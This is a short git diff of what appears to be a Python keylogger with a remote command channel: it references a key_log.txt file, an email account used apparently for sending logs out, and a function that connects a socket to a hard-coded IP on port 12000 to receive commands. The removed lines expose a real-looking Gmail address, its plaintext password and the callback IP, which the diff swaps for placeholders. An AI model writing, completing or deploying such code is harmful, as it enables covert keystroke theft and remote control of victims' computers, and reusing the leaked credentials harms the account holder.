@@ -81,8 +81,8 @@ import struct
 
 
 # Gloabl info
-email_adress = 'alicomp6441@gmail.com'
-email_adress_password = '5XY2Lq1iG0u9'
+email_adress = #FILL
+email_adress_password = #FILL
 
 
 keys_information_file = "key_log.txt"
@@ -689,7 +689,8 @@ def getting_info():
 
 def command_prompt():
     client = socket(AF_INET, SOCK_STREAM)
-    client.connect(("14.202.65.249", 12000))
+    connect_to_ip = #FILL
+    client.connect((connect_to_ip, 12000))
 
     while(1):
         data = recv_msg(client)
